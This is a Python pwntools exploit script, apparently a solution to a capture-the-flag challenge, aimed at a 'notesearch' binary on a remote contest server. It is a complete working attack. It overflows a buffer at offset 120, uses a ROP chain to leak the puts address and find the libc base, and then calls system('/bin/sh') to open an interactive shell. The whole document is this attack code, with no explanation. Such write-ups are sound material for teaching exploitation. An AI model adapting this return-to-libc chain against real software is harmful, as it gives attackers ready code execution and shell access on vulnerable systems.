from pwn import *
from z3 import *

elf = ELF('./notesearch')
libc = ELF('./libc6_2.31-0ubuntu9.2_amd64.so')
# p = process(elf.path)
# p = gdb.debug(elf.path, '''
# b *main+268
# c
# ''')
p = remote('bin.bcactf.com', 49159)

POP_RDI = 0x0000000000401703
RET = 0x0000000000401704

OFFSET = 120
payload = b'A' * (OFFSET)
payload += p64(POP_RDI) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])

p.sendline(payload)

p.recvuntil('-------\n')
leak = p.recvline().strip()
leak = u64(leak.ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
print("[+] libc_base", hex(libc.address))

BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.symbols["system"]
EXIT = libc.symbols["exit"]

print("[+] BINSH: ", hex(BINSH))
print("[+] SYSTEM: ", hex(SYSTEM))
print("[+] EXIT: ", hex(EXIT))

print(p.clean())
payload = b'A' * OFFSET
payload += p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
p.sendline(payload)

p.interactive()

